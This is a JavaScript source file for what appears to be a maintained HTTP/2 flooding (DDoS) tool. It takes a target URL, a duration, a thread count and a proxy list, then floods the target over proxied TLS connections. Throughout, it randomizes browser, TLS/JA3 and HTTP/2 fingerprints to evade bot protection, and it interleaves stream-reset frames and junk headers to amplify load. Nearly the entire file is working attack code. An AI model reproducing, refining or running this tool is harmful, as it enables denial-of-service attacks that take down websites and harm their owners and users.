//本脚本第一版作者为p2c,@ca98dun,由所念@firefly123456789，map@CLFchen共同维护至8.0版本，此版本为8.0的最新版
const fs = require('fs');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const crypto = require('crypto');
const os = require('os');
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.setMaxListeners(0);
process.on('uncaughtException', (e) => { console.log(e) });
process.on('unhandledRejection', (e) => { console.log(e) });

const target = process.argv[2];
const time = parseInt(process.argv[3], 10);
const threads = parseInt(process.argv[4], 10);
const ratelimit = parseInt(process.argv[5], 10);
const proxyInput = process.argv[6];
const proxies = proxyInput.includes(',') ? 
    proxyInput.split(',') : 
    [proxyInput];
const url = new URL(target);

const customUA = process.argv[7] || '';
const customCookies = process.argv[8];

console.log('--- 参数信息 ---');
console.log('目标 URL:', target);
console.log('持续时间 (秒):', time);
console.log('线程数:', threads);
console.log('速率限制:', ratelimit);
console.log('代理列表:', proxies);
console.log('User-Agent:', customUA);
console.log('Cookies:', customCookies);

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

function generateRandomString(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomString = '';
    for (let i = 0; i < length; i++) {
        randomString += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return randomString;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let chr = 100;
let chr_2 = 101;
let minifix = false;

setInterval(() => {
    chr = generateRandomNumber(100, 135);
    chr_2 = generateRandomNumber(100, 135);
    minifix = !minifix
}, 1000);

function generateBrowserBehavior() {
    
    const screenResolutions = [
        { width: 1920, height: 1080 },
        { width: 1366, height: 768 },
        { width: 1536, height: 864 },
        { width: 1440, height: 900 },
        { width: 1280, height: 720 },
        { width: 2560, height: 1440 },
        { width: 3840, height: 2160 }
    ];
    const screen = screenResolutions[Math.floor(Math.random() * screenResolutions.length)];

    
    const colorDepths = [24, 30, 48];
    const colorDepth = colorDepths[Math.floor(Math.random() * colorDepths.length)];

    
    const timezones = [
        'America/New_York',
        'America/Los_Angeles',
        'Europe/London',
        'Europe/Paris',
        'Asia/Tokyo',
        'Asia/Shanghai',
        'Australia/Sydney'
    ];
    const timezone = timezones[Math.floor(Math.random() * timezones.length)];

    
    const languages = [
        'en-US',
        'en-GB',
        'fr-FR',
        'de-DE',
        'es-ES',
        'it-IT',
        'pt-BR',
        'ru-RU',
        'ja-JP',
        'zh-CN',
        'ko-KR'
    ];
    const language = languages[Math.floor(Math.random() * languages.length)];

    
    const hardwareConcurrency = Math.pow(2, Math.floor(Math.random() * 4) + 2);
    const deviceMemory = Math.pow(2, Math.floor(Math.random() * 4) + 2);

    
    const webglVendors = [
        'Google Inc.',
        'Intel Inc.',
        'NVIDIA Corporation',
        'AMD',
        'Apple Inc.'
    ];
    const webglRenderers = [
        'ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0)',
        'ANGLE (NVIDIA, NVIDIA GeForce GTX 1060 Direct3D11 vs_5_0 ps_5_0)',
        'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)',
        'ANGLE (Intel, Intel(R) HD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
        'ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0)'
    ];
    const webglVendor = webglVendors[Math.floor(Math.random() * webglVendors.length)];
    const webglRenderer = webglRenderers[Math.floor(Math.random() * webglRenderers.length)];

    
    const plugins = [
        'PDF Viewer',
        'Chrome PDF Viewer',
        'Chromium PDF Viewer',
        'Microsoft Edge PDF Viewer',
        'WebKit built-in PDF',
        'Native Client'
    ];
    const selectedPlugins = plugins.sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * 3) + 1);

    const behavior = {
        screen,
        colorDepth,
        timezone,
        language,
        hardwareConcurrency,
        deviceMemory,
        webglVendor,
        webglRenderer,
        plugins: selectedPlugins,
        
        doNotTrack: Math.random() < 0.3 ? "1" : "0",
        cookieEnabled: Math.random() < 0.9,
        javaEnabled: Math.random() < 0.2,
        online: Math.random() < 0.95,
       
        performance: {
            timing: {
                navigationStart: Date.now() - Math.floor(Math.random() * 3600000),
                loadEventEnd: Date.now() - Math.floor(Math.random() * 1000)
            }
        }
    };

    return behavior;
}

function generateHeaders(url, streamId, type, statuses, version) {
    const randomString = generateRandomString(10);
    let newpathname = url.pathname;
    const header = {};
    
    
    const browserStates = {
        chrome: {
            versions: ['100.0.4896.127', '101.0.4951.67', '102.0.5005.115', '103.0.5060.134', '104.0.5112.102'],
            platforms: [
                'Windows NT 10.0; Win64; x64',
                'Windows NT 6.1; Win64; x64',
                'Macintosh; Intel Mac OS X 10_15_7',
                'X11; Linux x86_64',
                'X11; Ubuntu; Linux x86_64'
            ],
            acceptLanguages: [
                'en-US,en;q=0.9',
                'en-GB,en;q=0.8',
                'en-CA,en;q=0.9,fr-CA;q=0.8',
                'en-AU,en;q=0.9',
                'en-NZ,en;q=0.9'
            ],
            secChUa: [
                '"Google Chrome";v="100", "Chromium";v="100", "Not=A?Brand";v="99"',
                '"Google Chrome";v="101", "Chromium";v="101", "Not=A?Brand";v="99"',
                '"Google Chrome";v="102", "Chromium";v="102", "Not=A?Brand";v="99"'
            ]
        },
        firefox: {
            versions: ['100.0', '101.0', '102.0', '103.0', '104.0'],
            platforms: [
                'Windows NT 10.0; Win64; x64',
                'Windows NT 6.1; Win64; x64',
                'Macintosh; Intel Mac OS X 10.15',
                'X11; Linux x86_64',
                'X11; Ubuntu; Linux x86_64'
            ],
            acceptLanguages: [
                'en-US,en;q=0.5',
                'en-GB,en;q=0.5',
                'en-CA,en;q=0.5',
                'en-AU,en;q=0.5',
                'en-NZ,en;q=0.5'
            ],
            secChUa: [
                '"Firefox";v="100"',
                '"Firefox";v="101"',
                '"Firefox";v="102"'
            ]
        },
        edge: {
            versions: ['100.0.1185.44', '101.0.1210.47', '102.0.1245.44', '103.0.1264.48', '104.0.1293.54'],
            platforms: [
                'Windows NT 10.0; Win64; x64',
                'Windows NT 6.1; Win64; x64',
                'Macintosh; Intel Mac OS X 10_15_7',
                'X11; Linux x86_64'
            ],
            acceptLanguages: [
                'en-US,en;q=0.9',
                'en-GB,en;q=0.8',
                'en-CA,en;q=0.9',
                'en-AU,en;q=0.9',
                'en-NZ,en;q=0.9'
            ],
            secChUa: [
                '"Microsoft Edge";v="100", "Chromium";v="100", "Not=A?Brand";v="99"',
                '"Microsoft Edge";v="101", "Chromium";v="101", "Not=A?Brand";v="99"',
                '"Microsoft Edge";v="102", "Chromium";v="102", "Not=A?Brand";v="99"'
            ]
        },
        safari: {
            versions: ['15.5', '15.6', '16.0', '16.1', '16.2'],
            platforms: [
                'Macintosh; Intel Mac OS X 10_15_7',
                'Macintosh; Intel Mac OS X 11_6_7',
                'Macintosh; Intel Mac OS X 12_5_1',
                'Macintosh; Intel Mac OS X 13_0_1'
            ],
            acceptLanguages: [
                'en-US,en;q=0.9',
                'en-GB,en;q=0.8',
                'en-CA,en;q=0.9',
                'en-AU,en;q=0.9',
                'en-NZ,en;q=0.9'
            ],
            secChUa: [
                '"Safari";v="15.5"',
                '"Safari";v="15.6"',
                '"Safari";v="16.0"'
            ]
        }
    };

    const browsers = ['chrome', 'firefox', 'edge', 'safari'];
    const selectedBrowser = browsers[Math.floor(Math.random() * browsers.length)];
    const browser = browserStates[selectedBrowser];

    const browserVersion = browser.versions[Math.floor(Math.random() * browser.versions.length)];
    const platform = browser.platforms[Math.floor(Math.random() * browser.platforms.length)];
    const acceptLanguage = browser.acceptLanguages[Math.floor(Math.random() * browser.acceptLanguages.length)];
    const secChUa = browser.secChUa[Math.floor(Math.random() * browser.secChUa.length)];

    
    const behavior = generateBrowserBehavior();

   
    if (streamId === 1) { 
        header["pragma"] = "no-cache"; 
        header["cache-control"] = "no-cache"; 
    }
    
   
    header['sec-ch-ua'] = secChUa;
    header['sec-ch-ua-mobile'] = platform.includes('Mobile') ? "?1" : "?0";
    header['sec-ch-ua-platform'] = platform;
    header['upgrade-insecure-requests'] = "1";
    header['user-agent'] = customUA || 
        `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) ${selectedBrowser === 'chrome' ? 'Chrome' : selectedBrowser === 'firefox' ? 'Firefox' : selectedBrowser === 'edge' ? 'Edg' : 'Safari'}/${browserVersion}`;
    header['Cookie'] = customCookies
    header['accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
    header['sec-fetch-site'] = "same-origin";
    header['sec-fetch-mode'] = "navigate";
    header['sec-fetch-user'] = "?1";
    header['sec-fetch-dest'] = "document";
    header['accept-encoding'] = "gzip, deflate, br";
    header['accept-language'] = acceptLanguage;
    header['priority'] = "u=0, i";
    
    
    const refererDomains = [
        'google.com',
        'bing.com',
        'yahoo.com',
        'facebook.com',
        'twitter.com',
        'reddit.com',
        'linkedin.com',
        'instagram.com'
    ];
    const refererDomain = refererDomains[Math.floor(Math.random() * refererDomains.length)];
    header['referer'] = `https://${refererDomain}/`;

    
    if (behavior.doNotTrack === "1") {
        header['dnt'] = "1";
    }
    if (behavior.javaEnabled) {
        header['sec-ch-ua-java'] = "true";
    }
    if (!behavior.online) {
        header['x-offline'] = "true";
    }

    return { header, newpathname };
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    const payload = data.subarray(9 + offset, 9 + offset + length);
    if (payload.length + offset != length) return null;
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

function generateCiphers() {
    const browserFingerprints = {
      chrome: [
        "TLS_AES_128_GCM_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "ECDHE-ECDSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-CHACHA20-POLY1305",
        "ECDHE-RSA-CHACHA20-POLY1305",
        "ECDHE-RSA-AES128-SHA",
        "ECDHE-RSA-AES256-SHA",
        "AES128-GCM-SHA256",
        "AES256-GCM-SHA384",
        "AES128-SHA",
        "AES256-SHA"
      ],
      firefox: [
        "TLS_AES_128_GCM_SHA256",
        "TLS_CHACHA20_POLY1305_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "ECDHE-ECDSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-ECDSA-CHACHA20-POLY1305",
        "ECDHE-RSA-CHACHA20-POLY1305",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-AES256-SHA384",
        "ECDHE-RSA-AES256-SHA384",
        "ECDHE-ECDSA-AES128-SHA256",
        "ECDHE-RSA-AES128-SHA256"
      ],
      safari: [
        "TLS_AES_128_GCM_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "ECDHE-ECDSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-CHACHA20-POLY1305",
        "ECDHE-RSA-CHACHA20-POLY1305",
        "AES128-GCM-SHA256",
        "AES256-GCM-SHA384"
      ]
    };
    
    const browsers = ['chrome', 'firefox', 'safari'];
    const selectedBrowser = browsers[Math.floor(Math.random() * browsers.length)];
    return browserFingerprints[selectedBrowser].join(':');
  }

let version = 100;
let statuses = {};
const statusesQ = [];
let yasinpidora1 = 11111;
let yasinpidora4 = 22222;
let yasinpidora6 = 12121;

setInterval(() => version++, 3000);

function generateJA3Fingerprint() {
    const tlsVersions = ['TLSv1.2', 'TLSv1.3'];
    const ciphers = [
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'ECDHE-ECDSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-CHACHA20-POLY1305',
        'ECDHE-RSA-CHACHA20-POLY1305',
        'ECDHE-RSA-AES128-SHA',
        'ECDHE-RSA-AES256-SHA',
        'AES128-GCM-SHA256',
        'AES256-GCM-SHA384',
        'AES128-SHA',
        'AES256-SHA'
    ];
    
    const extensions = [
        'server_name',
        'extended_master_secret',
        'renegotiation_info',
        'supported_groups',
        'ec_point_formats',
        'signature_algorithms',
        'application_layer_protocol_negotiation',
        'status_request',
        'signed_certificate_timestamp',
        'padding',
        'key_share',
        'pre_shared_key'
    ];
    
    const ellipticCurves = [
        'X25519',
        'P-256',
        'P-384',
        'P-521'
    ];
    
    const signatureAlgorithms = [
        'ecdsa_secp256r1_sha256',
        'rsa_pss_rsae_sha256',
        'rsa_pkcs1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha384',
        'rsa_pss_rsae_sha512',
        'rsa_pkcs1_sha512'
    ];
    
    return {
        tlsVersion: tlsVersions[Math.floor(Math.random() * tlsVersions.length)],
        ciphers: ciphers.sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * 5) + 5),
        extensions: extensions.sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * 5) + 5),
        ellipticCurves: ellipticCurves.sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * 2) + 1),
        signatureAlgorithms: signatureAlgorithms.sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * 3) + 2)
    };
}

function generateHTTP2Fingerprint() {
    const settings = {
        HEADER_TABLE_SIZE: [4096, 8192, 16384, 32768, 65536],
        ENABLE_PUSH: [0, 1],
        MAX_CONCURRENT_STREAMS: [100, 200, 500, 1000],
        INITIAL_WINDOW_SIZE: [65535, 131072, 262144, 524288],
        MAX_FRAME_SIZE: [16384, 32768, 65536],
        MAX_HEADER_LIST_SIZE: [8192, 16384, 32768, 65536],
        ENABLE_CONNECT_PROTOCOL: [0, 1]
    };
    
    const http2Settings = {};
    for (const [key, values] of Object.entries(settings)) {
        http2Settings[key] = values[Math.floor(Math.random() * values.length)];
    }
    
    return http2Settings;
}

function generateBrowserFingerprint() {
    const screenResolutions = [
        '1920x1080',
        '1366x768',
        '1536x864',
        '1440x900',
        '1280x720',
        '2560x1440',
        '3840x2160'
    ];
    
    const colorDepths = [24, 30, 48];
    const timezones = [
        'America/New_York',
        'America/Los_Angeles',
        'Europe/London',
        'Europe/Paris',
        'Asia/Tokyo',
        'Asia/Shanghai',
        'Australia/Sydney'
    ];
    
    const languages = [
        'en-US',
        'en-GB',
        'fr-FR',
        'de-DE',
        'es-ES',
        'it-IT',
        'pt-BR',
        'ru-RU',
        'ja-JP',
        'zh-CN',
        'ko-KR'
    ];
    
    return {
        screenResolution: screenResolutions[Math.floor(Math.random() * screenResolutions.length)],
        colorDepth: colorDepths[Math.floor(Math.random() * colorDepths.length)],
        timezone: timezones[Math.floor(Math.random() * timezones.length)],
        language: languages[Math.floor(Math.random() * languages.length)],
        hardwareConcurrency: Math.pow(2, Math.floor(Math.random() * 4) + 2),
        deviceMemory: Math.pow(2, Math.floor(Math.random() * 4) + 2)
    };
}

function startRequest() {
    try {
        const proxy = proxies[~~(Math.random() * proxies.length)];
        if (!proxy || !proxy.includes(':')) {
            return;
        }

        const [proxyHost, proxyPort] = proxy.split(':');
        const port = Number(proxyPort);
        
        if (isNaN(port) || port < 0 || port > 65535) {
            return;
        }

        let SocketTLS;
        let isConnectionReused = false;
        let reuseCount = 0;
        const maxReuseCount = Math.floor(Math.random() * 5) + 3; // 随机复用3-7次

        const ja3Fingerprint = generateJA3Fingerprint();
        const http2Fingerprint = generateHTTP2Fingerprint();
        const browserFingerprint = generateBrowserFingerprint();

        var netSocket = net.connect(port, proxyHost, () => {
            netSocket.once('data', () => {
                const protocols = ['h2', 'http/1.1'];
                const selectedProtocol = protocols[Math.floor(Math.random() * protocols.length)];
                SocketTLS = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    servername: url.host,
                    ciphers: ja3Fingerprint.ciphers.join(':'),
                    sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | 
                                 crypto.constants.SSL_OP_NO_TICKET | 
                                 crypto.constants.SSL_OP_NO_SSLv2 | 
                                 crypto.constants.SSL_OP_NO_SSLv3 | 
                                 crypto.constants.SSL_OP_NO_COMPRESSION | 
                                 crypto.constants.SSL_OP_NO_RENEGOTIATION | 
                                 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | 
                                 crypto.constants.SSL_OP_TLSEXT_PADDING | 
                                 crypto.constants.SSL_OP_ALL | 
                                 crypto.constants.SSLcom,
                    session: crypto.randomBytes(64),
                    secure: true,
                    rejectUnauthorized: false,
                    minVersion: ja3Fingerprint.tlsVersion,
                    maxVersion: ja3Fingerprint.tlsVersion,
                    ecdhCurve: ja3Fingerprint.ellipticCurves[0]
                }, () => {
                    let streamId = 1;
                    let streamIdReset = 1;
                    let data = Buffer.alloc(0);
                    let hpack = new HPACK();
                    hpack.setTableSize(http2Fingerprint.HEADER_TABLE_SIZE);

                    const updateWindow = Buffer.alloc(4);
                    updateWindow.writeUInt32BE(http2Fingerprint.INITIAL_WINDOW_SIZE, 0);

                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            [1, http2Fingerprint.HEADER_TABLE_SIZE],
                            [2, http2Fingerprint.ENABLE_PUSH],
                            [3, http2Fingerprint.MAX_CONCURRENT_STREAMS],
                            [4, http2Fingerprint.INITIAL_WINDOW_SIZE],
                            [5, http2Fingerprint.MAX_FRAME_SIZE],
                            [6, http2Fingerprint.MAX_HEADER_LIST_SIZE],
                            [8, http2Fingerprint.ENABLE_CONNECT_PROTOCOL]
                        ])),
                        encodeFrame(0, 8, updateWindow)
                    ];

                    SocketTLS.on('data', (eventData) => {
                        data = Buffer.concat([data, eventData]);
                        while (data.length >= 9) {
                            const frame = decodeFrame(data);
                            if (frame != null) {
                                data = data.subarray(frame.length + 9);
                                if (frame.type == 4 && frame.flags == 0) {
                                    SocketTLS.write(encodeFrame(0, 4, "", 1));
                                }

                                if (frame.type == 1) {
                                    const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];

                                    if (status === 403) {
                                        SocketTLS.end();
                                    }

                                    if (!statuses[status])
                                        statuses[status] = 0

                                    statuses[status]++

                                    
                                    if (status === 200 && !isConnectionReused && reuseCount < maxReuseCount) {
                                        isConnectionReused = true;
                                        reuseCount++;
                                        setTimeout(() => {
                                            if (SocketTLS && !SocketTLS.destroyed && SocketTLS.writable) {
                                                sendRequests(SocketTLS, streamId, streamIdReset, hpack, selectedProtocol);
                                            }
                                        }, Math.random() * 1000 + 500); 
                                    }
                                }

                                if (frame.type == 7 || frame.type == 5) {
                                    if (frame.type == 7) {
                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0

                                        statuses["GOAWAY"]++
                                    }
                                    SocketTLS.end();
                                }
                            } else {
                                break;
                            }
                        }
                    });

                    SocketTLS.write(Buffer.concat(frames));
                    sendRequests(SocketTLS, streamId, streamIdReset, hpack, selectedProtocol);
                });

                SocketTLS.on('error', (error) => cleanup(error));
                SocketTLS.on('close', () => cleanup());
            });
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });

        netSocket.on('error', (error) => {
            cleanup();
        });
        netSocket.on('close', () => {
            cleanup();
        });

        function cleanup(error) {
            if (error) {
                //console.log('Error during cleanup:', error);
            }
            if (netSocket) {
                netSocket.destroy();
                netSocket = null;
            }
            if (SocketTLS) {
                SocketTLS.end();
                SocketTLS = null;
            }
        }
    } catch (error) {
        console.log('Error during startRequest:', error);
        cleanup();
    }
}


function sendRequests(SocketTLS, streamId, streamIdReset, hpack, selectedProtocol) {
    if (SocketTLS && !SocketTLS.destroyed && SocketTLS.writable) {
        for (let i = 0; i < ratelimit; i++) {
            const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
            const { header, newpathname } = generateHeaders(url, streamId, 0, statuses, version);


            const headers = Object.entries({
                ':method': 'GET',
                ':authority': url.hostname,
                ':scheme': 'https',
                ":path": `${newpathname}`,
            }).concat(Object.entries({
                ...header,
            }).filter(a => a[1] != null));

            const headers2 = Object.entries({
                ...(Math.random() < 0.5 && { "ultreminikall-x": `${randomString}=${randomString}` }),
                ...(Math.random() < 0.5 && { "stresserapp-xss": `${randomString}=${randomString}` }),
                ...(Math.random() < 0.5 && { "streswergserapp-xss": `${randomString}=${randomString}` }),
                ...(Math.random() < 0.5 && { "stressewegrrapp-xss": `${randomString}=${randomString}` }),
                ...(Math.random() < 0.5 && { "stresrjtyserapp-xss": `${randomString}=${randomString}` }),
                ...(Math.random() < 0.5 && { "wsegwegfw": `${randomString}=${randomString}` }),
                ...(Math.random() < 0.5 && { "ultremiwegwgwnikall-x": `${randomString}=${randomString}` }),
                ...(Math.random() < 0.5 && { "stresserappsdfsf-xss": `${randomString}=${randomString}` }),
                ...(Math.random() < 0.5 && { "streswewefwegrgserapp-xss": `${randomString}=${randomString}` }),
                ...(Math.random() < 0.5 && { "stressherhewegrrapp-xss": `${randomString}=${randomString}` }),
                ...(Math.random() < 0.5 && { "stresrasdsafwjtyserapp-xss": `${randomString}=${randomString}` }),
            }).filter(a => a[1] != null);

            const combinedHeaders = headers.concat(headers2);

            
            const httpVersions = ['HTTP/1.1', 'HTTP/2.0'];
            const selectedHttpVersion = httpVersions[Math.floor(Math.random() * httpVersions.length)];

            if (selectedProtocol === 'h2') {
                let packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(combinedHeaders)
                ]);

                SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                    SocketTLS.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                }

                streamIdReset += 2;
                streamId += 2;
            } else {
                const headerLines = headers.map(([name, value]) => `${name}: ${value}`).join('\r\n');
                const request = `GET ${newpathname} ${selectedHttpVersion}\r\n${headerLines}\r\n\r\n`;
                SocketTLS.write(request);
            }
        }
    }
}

if (cluster.isMaster) {
    const workers = {}; 
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Main start :)`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    setInterval(() => {
        let statuses = {};
        for (let w in workers) {
            if (workers[w][0].state == 'online') {
                for (let st of workers[w][1]) {
                    for (let code in st) {
                        if (statuses[code] == null)
                            statuses[code] = 0;

                        statuses[code] += st[code];
                    }
                }
            }
        }

        console.clear();
        console.log({
    statuses,
    proxy: proxyInput
});

    }, 1000);

    setTimeout(() => process.exit(1), time * 1000);
} else {
    setInterval(() => {
        startRequest();
    });

    setInterval(() => {
        if (statusesQ.length >= 4)
            statusesQ.shift();

        statusesQ.push(statuses);
        statuses = {};
        process.send(statusesQ);
    }, 950);

    setTimeout(() => process.exit(1), time * 1000);
}
